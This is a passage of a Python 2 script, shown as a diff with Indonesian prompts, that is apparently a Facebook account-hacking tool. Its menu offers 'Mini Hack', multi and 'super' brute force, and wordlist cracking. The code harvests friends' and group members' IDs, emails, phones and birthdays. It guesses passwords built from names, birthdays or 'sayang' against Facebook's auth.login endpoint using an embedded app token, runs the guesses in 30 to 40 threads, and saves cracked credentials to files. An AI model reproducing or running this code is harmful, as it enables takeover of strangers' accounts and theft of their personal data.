+    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMohon Tunggu \x1b[1;97m...')
+    r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
+    cok = json.loads(r.text)
+    for p in cok['data']:
+        if id in p['name'] or id in p['id']:
+            r = requests.get('https://graph.facebook.com/' + p['id'] + '?access_token=' + toket)
+            z = json.loads(r.text)
+            print 52 * '\x1b[1;97m\xe2\x95\x90'
+            try:
+                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNama\x1b[1;97m          : ' + z['name']
+            except KeyError:
+                print '\x1b[1;91m[?] \x1b[1;92mNama\x1b[1;97m          : \x1b[1;91mTidak Ada'
+            else:
+                try:
+                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mID\x1b[1;97m            : ' + z['id']
+                except KeyError:
+                    print '\x1b[1;91m[?] \x1b[1;92mID\x1b[1;97m            : \x1b[1;91mTidak Ada'
+                else:
+                    try:
+                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mEmail\x1b[1;97m         : ' + z['email']
+                    except KeyError:
+                        print '\x1b[1;91m[?] \x1b[1;92mEmail\x1b[1;97m         : \x1b[1;91mTidak Ada'
+                    else:
+                        try:
+                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNomor Telpon\x1b[1;97m  : ' + z['mobile_phone']
+                        except KeyError:
+                            print '\x1b[1;91m[?] \x1b[1;92mNomor Telpon\x1b[1;97m  : \x1b[1;91mNot found'
+                        else:
+                            try:
+                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mLokasi\x1b[1;97m      : ' + z['location']['name']
+                            except KeyError:
+                                print '\x1b[1;91m[?] \x1b[1;92mLokasi\x1b[1;97m      : \x1b[1;91mTidak Ada'
+
+                            try:
+                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mLahir\x1b[1;97m      : ' + z['birthday']
+                            except KeyError:
+                                print '\x1b[1;91m[?] \x1b[1;92mLahir\x1b[1;97m      : \x1b[1;91mTidak Ada'
+
+                    try:
+                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mSekolah\x1b[1;97m        : '
+                        for q in z['education']:
+                            try:
+                                print '\x1b[1;91m                   ~ \x1b[1;97m' + q['school']['name']
+                            except KeyError:
+                                print '\x1b[1;91m                   ~ \x1b[1;91mTidak Ada'
+
+                    except KeyError:
+                        pass
+
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            menu()
+    else:
+        print '\x1b[1;91m[\xe2\x9c\x96] Pengguna Tidak Ada'
+        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+        menu()
+
+
+def menu_hack():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(0.01)
+        login()
+
+    os.system('clear')
+    print logo
+    print 52 * '\x1b[1;97m\xe2\x95\x90'
+    print '\xe2\x95\x91-> \x1b[1;37;40m1. Mini Hack Facebook (\x1b[1;92mTarget\x1b[1;97m)'
+    print '\xe2\x95\x91-> \x1b[1;37;40m2. Multi Bruteforce Facebook'
+    print '\xe2\x95\x91-> \x1b[1;37;40m3. Super Multi Bruteforce Facebook'
+    print '\xe2\x95\x91-> \x1b[1;37;40m4. BruteForce (\x1b[1;92mTarget\x1b[1;97m)'
+    print '\xe2\x95\x91-> \x1b[1;37;40m5. Yahoo Clone'
+    print '\xe2\x95\x91-> \x1b[1;37;40m6. Ambil ID/Email/HP'
+    print '\xe2\x95\x91-> \x1b[1;31;40m0. Back'
+    print '\x1b[1;37;40m\xe2\x95\x91'
+    hack_pilih()
+
+
+def hack_pilih():
+    hack = raw_input('\xe2\x95\x9a\xe2\x95\x90\x1b[1;91m\xe2\x96\xb6\x1b[1;97m ')
+    if hack == '':
+        print "\x1b[1;91m[!] Can't empty"
+        hack_pilih()
+    elif hack == '1':
+        mini()
+    elif hack == '2':
+        crack()
+        hasil()
+    elif hack == '3':
+        super()
+    elif hack == '4':
+        brute()
+    elif hack == '5':
+        menu_yahoo()
+    elif hack == '6':
+        grab()
+    elif hack == '0':
+        menu()
+    else:
+        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + hack + ' \x1b[1;91mNot found'
+        hack_pilih()
+
+
+def mini():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(0.01)
+        login()
+    else:
+        os.system('clear')
+        print logo
+        print 52 * '\x1b[1;97m\xe2\x95\x90'
+        print '\x1b[1;91m[ INFO ] Target must be your friend !'
+        try:
+            id = raw_input('\x1b[1;91m[+] \x1b[1;92mID Target \x1b[1;91m:\x1b[1;97m ')
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
+            r = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
+            a = json.loads(r.text)
+            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mName\x1b[1;97m : ' + a['name']
+            jalan('\x1b[1;91m[+] \x1b[1;92mChecking \x1b[1;97m...')
+            time.sleep(1)
+            jalan('\x1b[1;91m[+] \x1b[1;92mOpen security \x1b[1;97m...')
+            time.sleep(1)
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
+            print 52 * '\x1b[1;97m\xe2\x95\x90'
+            pz1 = a['first_name'] + '123'
+            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+            y = json.load(data)
+            if 'access_token' in y:
+                print '\x1b[1;91m[+] \x1b[1;92mFounded.'
+                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
+                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
+                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz1
+                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+                menu_hack()
+            elif 'www.facebook.com' in y['error_msg']:
+                print '\x1b[1;91m[+] \x1b[1;92mFounded.'
+                print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
+                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
+                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
+                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz1
+                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+                menu_hack()
+            else:
+                pz2 = a['first_name'] + '12345'
+                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                y = json.load(data)
+                if 'access_token' in y:
+                    print '\x1b[1;91m[+] \x1b[1;92mFounded.'
+                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
+                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
+                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz2
+                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+                    menu_hack()
+                elif 'www.facebook.com' in y['error_msg']:
+                    print '\x1b[1;91m[+] \x1b[1;92mFounded.'
+                    print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
+                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
+                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
+                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz2
+                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+                    menu_hack()
+                else:
+                    pz3 = a['last_name'] + '123'
+                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                    y = json.load(data)
+                    if 'access_token' in y:
+                        print '\x1b[1;91m[+] \x1b[1;92mFounded.'
+                        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
+                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
+                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz3
+                        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+                        menu_hack()
+                    elif 'www.facebook.com' in y['error_msg']:
+                        print '\x1b[1;91m[+] \x1b[1;92mFounded.'
+                        print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
+                        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
+                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
+                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz3
+                        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+                        menu_hack()
+                    else:
+                        lahir = a['birthday']
+                        pz4 = lahir.replace('/', '')
+                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                        y = json.load(data)
+                        if 'access_token' in y:
+                            print '\x1b[1;91m[+] \x1b[1;92mFounded.'
+                            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
+                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
+                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz4
+                            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+                            menu_hack()
+                        elif 'www.facebook.com' in y['error_msg']:
+                            print '\x1b[1;91m[+] \x1b[1;92mFounded.'
+                            print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
+                            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
+                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
+                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz4
+                            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+                            menu_hack()
+                        else:
+                            pz5 = 'sayang'
+                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                            y = json.load(data)
+                            if 'access_token' in y:
+                                print '\x1b[1;91m[+] \x1b[1;92mFounded.'
+                                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
+                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
+                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz5
+                                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+                                menu_hack()
+                            elif 'www.facebook.com' in y['error_msg']:
+                                print '\x1b[1;91m[+] \x1b[1;92mFounded.'
+                                print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
+                                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
+                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
+                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz5
+                                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+                                menu_hack()
+                            else:
+                                print '\x1b[1;91m[!] Sorry, opening password target failed :('
+                                print '\x1b[1;91m[!] Try other method.'
+                                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+                                menu_hack()
+        except KeyError:
+            print '\x1b[1;91m[!] Terget not found'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            menu_hack()
+
+
+def crack():
+    global file
+    global idlist
+    global passw
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(0.01)
+        login()
+    else:
+        os.system('clear')
+        print logo
+        print 52 * '\x1b[1;97m\xe2\x95\x90'
+        idlist = raw_input('\x1b[1;91m[+] \x1b[1;92mFile ID  \x1b[1;91m: \x1b[1;97m')
+        passw = raw_input('\x1b[1;91m[+] \x1b[1;92mPassword \x1b[1;91m: \x1b[1;97m')
+        try:
+            file = open(idlist, 'r')
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
+            for x in range(40):
+                zedd = threading.Thread(target=scrak, args=())
+                zedd.start()
+                threads.append(zedd)
+
+            for zedd in threads:
+                zedd.join()
+
+        except IOError:
+            print '\x1b[1;91m[!] File not found'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            menu_hack()
+
+
+def scrak():
+    global back
+    global berhasil
+    global cekpoint
+    global gagal
+    global up
+    try:
+        buka = open(idlist, 'r')
+        up = buka.read().split()
+        while file:
+            username = file.readline().strip()
+            url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + passw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
+            data = urllib.urlopen(url)
+            mpsh = json.load(data)
+            if back == len(up):
+                break
+            if 'access_token' in mpsh:
+                bisa = open('Berhasil.txt', 'w')
+                bisa.write(username + ' | ' + passw + '\n')
+                bisa.close()
+                berhasil.append('\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] ' + username + ' | ' + passw)
+                back += 1
+            elif 'www.facebook.com' in mpsh['error_msg']:
+                cek = open('Cekpoint.txt', 'w')
+                cek.write(username + ' | ' + passw + '\n')
+                cek.close()
+                cekpoint.append('\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + username + ' | ' + passw)
+                back += 1
+            else:
+                gagal.append(username)
+                back += 1
+            sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack    \x1b[1;91m:\x1b[1;97m ' + str(back) + ' \x1b[1;96m>\x1b[1;97m ' + str(len(up)) + ' =>\x1b[1;92mLive\x1b[1;91m:\x1b[1;96m' + str(len(berhasil)) + ' \x1b[1;97m=>\x1b[1;93mCheck\x1b[1;91m:\x1b[1;96m' + str(len(cekpoint)))
+            sys.stdout.flush()
+
+    except IOError:
+        print '\n\x1b[1;91m[!] Connection busy'
+        time.sleep(0.01)
+    except requests.exceptions.ConnectionError:
+        print '\x1b[1;91m[\xe2\x9c\x96] No connection'
+
+
+def hasil():
+    print
+    print 52 * '\x1b[1;97m\xe2\x95\x90'
+    for b in berhasil:
+        print b
+
+    for c in cekpoint:
+        print c
+
+    print
+    print '\x1b[31m[x] Failed \x1b[1;97m--> ' + str(len(gagal))
+    keluar()
+
+
+def super():
+    global toket
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+
+    os.system('clear')
+    print logo
+    print 52 * '\x1b[1;97m\xe2\x95\x90'
+    print '\xe2\x95\x91-> \x1b[1;37;40m1. Crack from Friends'
+    print '\xe2\x95\x91-> \x1b[1;37;40m2. Crack from Group'
+    print '\xe2\x95\x91-> \x1b[1;37;40m3. Crack from File'
+    print '\xe2\x95\x91-> \x1b[1;31;40m0. Kembali'
+    print '\x1b[1;37;40m\xe2\x95\x91'
+    pilih_super()
+
+
+def pilih_super():
+    peak = raw_input('\xe2\x95\x9a\xe2\x95\x90\x1b[1;91m\xe2\x96\xb6\x1b[1;97m ')
+    if peak == '':
+        print "\x1b[1;91m[!] Can't empty"
+        pilih_super()
+    elif peak == '1':
+        os.system('clear')
+        print logo
+        print 52 * '\x1b[1;97m\xe2\x95\x90'
+        jalan('\x1b[1;91m[+] \x1b[1;92mMengambil id Teman \x1b[1;97m...')
+        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
+        z = json.loads(r.text)
+        for s in z['data']:
+            id.append(s['id'])
+
+    elif peak == '2':
+        os.system('clear')
+        print logo
+        print 52 * '\x1b[1;97m\xe2\x95\x90'
+        idg = raw_input('\x1b[1;91m[+] \x1b[1;92mID Group   \x1b[1;91m:\x1b[1;97m ')
+        try:
+            r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
+            asw = json.loads(r.text)
+            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
+        except KeyError:
+            print '\x1b[1;91m[!] Group not found'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            super()
+
+        re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
+        s = json.loads(re.text)
+        for i in s['data']:
+            id.append(i['id'])
+
+    elif peak == '3':
+        os.system('clear')
+        print logo
+        print 52 * '\x1b[1;97m\xe2\x95\x90'
+        try:
+            idlist = raw_input('\x1b[1;91m[+] \x1b[1;92mFile ID  \x1b[1;91m: \x1b[1;97m')
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '\x1b[1;91m[!] File not found'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            super()
+
+    elif peak == '0':
+        menu_hack()
+    else:
+        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mTidak ada'
+        pilih_super()
+    print '\x1b[1;91m[+] \x1b[1;92mTotal ID \x1b[1;91m: \x1b[1;97m' + str(len(id))
+    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMohon Tunggu \x1b[1;97m...')
+    titik = ['.   ', '..  ', '... ']
+    for o in titik:
+        print '\r\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack \x1b[1;97m' + o,
+        sys.stdout.flush()
+        time.sleep(0.01)
+
+    print
+    print 52 * '\x1b[1;97m\xe2\x95\x90'
+
+    def main(arg):
+        user = arg
+        try:
+            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
+            b = json.loads(a.text)
+            pass1 = b['first_name'] + '123'
+            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;97m\x1b[1;92m[\xe2\x9c\x93]\x1b[1;97m ' + user + ' | ' + pass1 + ' --> ' + b['name']
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;97m\x1b[1;93m[+]\x1b[1;97m ' + user + ' | ' + pass1 + ' --> ' + b['name']
+            else:
+                pass2 = b['firs_name'] + '12345'
+                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                q = json.load(data)
+                if 'access_token' in q:
+                    print '\x1b[1;97m\x1b[1;92m[\xe2\x9c\x93]\x1b[1;97m ' + user + ' | ' + pass2 + ' --> ' + b['name']
+                elif 'www.facebook.com' in q['error_msg']:
+                    print '\x1b[1;97m\x1b[1;93m[+]\x1b[1;97m ' + user + ' | ' + pass2 + ' --> ' + ['name']
+                else:
+                    pass3 = b['last_name'] + '123'
+                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                    q = json.load(data)
+                    if 'access_token' in q:
+                        print '\x1b[1;97m\x1b[1;92m[\xe2\x9c\x93]\x1b[1;97m ' + user + ' | ' + pass3 + ' --> ' + b['name']
+                    elif 'www.facebook.com' in q['error_msg']:
+                        print '\x1b[1;97m\x1b[1;93m[+]\x1b[1;97m ' + user + ' | ' + pass3 + ' --> ' + b['name']
+                    else:
+                        pass4 = b['last_name'] + '12345'
+                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                        q = json.load(data)
+                        if 'access_token' in q:
+                            print '\x1b[1;97m\x1b[1;92m[\xe2\x9c\x93]\x1b[1;97m ' + user + ' | ' + pass4 + ' --> ' + b['name']
+                        elif 'www.facebook.com' in q['error_msg']:
+                            print '\x1b[1;97m\x1b[1;93m[+]\x1b[1;97m ' + user + ' | ' + pass4 + ' --> ' + b['name']
+                        else:
+                            birthday = b['birthday']
+                            pass5 = birthday.replace('/', '')
+                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                            q = json.load(data)
+                            if 'access_token' in q:
+                                print '\x1b[1;97m\x1b[1;92m[\xe2\x9c\x93]\x1b[1;97m ' + user + ' | ' + pass5 + ' --> ' + b['name']
+                            elif 'www.facebook.com' in q['error_msg']:
+                                print '\x1b[1;97m[\x1b[1;93m[+]\x1b[1;97m ' + user + ' | ' + pass5 + ' --> ' + b['name']
+                            else:
+                                pass6 = 'sayang'
+                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                q = json.load(data)
+                                if 'access_token' in q:
+                                    print '\x1b[1;97m\x1b[1;92m[\xe2\x9c\x93]\x1b[1;97m ' + user + ' | ' + pass6 + ' --> ' + b['name']
+                                elif 'www.facebook.com' in q['error_msg']:
+                                    print '\x1b[1;97m\x1b[1;93m[+]\x1b[1;97m ' + user + ' | ' + pass6 + ' --> ' + b['name']
+        except:
+            pass
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
+    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+    super()
+
+
+def brute():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(0.5)
+        login()
+    else:
+        os.system('clear')
+        print logo
+        print '\xe2\x95\x94' + 52 * '\x1b[1;97m\xe2\x95\x90'
+        try:
+            email = raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail\x1b[1;97m/\x1b[1;92mHp \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')
+            passw = raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;97mext(list.txt) \x1b[1;91m: \x1b[1;97m')
+            total = open(passw, 'r')
+            total = total.readlines()
+            print 52 * '\x1b[1;97m\xe2\x95\x90'
+            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
+            print '\x1b[1;91m[+] \x1b[1;92mTotal\x1b[1;96m ' + str(len(total)) + ' \x1b[1;92mPassword'
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
+            sandi = open(passw, 'r')
+            for pw in sandi:
+                try:
+                    pw = pw.replace('\n', '')
+                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mTry \x1b[1;97m' + pw)
+                    sys.stdout.flush()
+                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                    mpsh = json.loads(data.text)
+                    if 'access_token' in mpsh:
+                        dapat = open('Brute.txt', 'w')
+                        dapat.write(email + ' | ' + pw + '\n')
+                        dapat.close()
+                        print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
+                        print 52 * '\x1b[1;97m\xe2\x95\x90'
+                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
+                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
+                        keluar()
+                    elif 'www.facebook.com' in mpsh['error_msg']:
+                        ceks = open('Brutecekpoint.txt', 'w')
+                        ceks.write(email + ' | ' + pw + '\n')
+                        ceks.close()
+                        print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
+                        print 52 * '\x1b[1;97m\xe2\x95\x90'
+                        print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
+                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
+                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
+                        keluar()
+                except requests.exceptions.ConnectionError:
+                    print '\x1b[1;91m[!] Connection Error'
+                    time.sleep(1)
+
+        except IOError:
+            print '\x1b[1;91m[!] File not found...'
+            print '\n\x1b[1;91m[!] \x1b[1;92mSepertinya kamu tidak memiliki wordlist'
+            tanyaw()
+
+
+def tanyaw():
+    why = raw_input('\x1b[1;91m[?] \x1b[1;92mKamu ingin membuat  wordlist ? \x1b[1;92m[y/t]\x1b[1;91m:\x1b[1;97m ')
+    if why == '':
+        print '\x1b[1;91m[!] Mohon Pilih \x1b[1;97m(y/t)'
+        tanyaw()
+    elif why == 'y':
+        wordlist()
+    elif why == 'Y':
+        wordlist()
+    elif why == 't':
+        menu_hack()
+    elif why == 'T':
+        menu_hack()
+    else:
+        print '\x1b[1;91m[!] Mohon Pilih \x1b[1;97m(y/t)'
+        tanyaw()
+
+
+def menu_yahoo():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+
+    os.system('clear')
+    print logo
+    print 52 * '\x1b[1;97m\xe2\x95\x90'
+    print '\xe2\x95\x91-> \x1b[1;37;40m1. From Friends'
+    print '\xe2\x95\x91-> \x1b[1;37;40m2. From File'
+    print '\xe2\x95\x91-> \x1b[1;31;40m0. Back'
+    print '\x1b[1;37;40m\xe2\x95\x91'
+    yahoo_pilih()
+
+
+def yahoo_pilih():
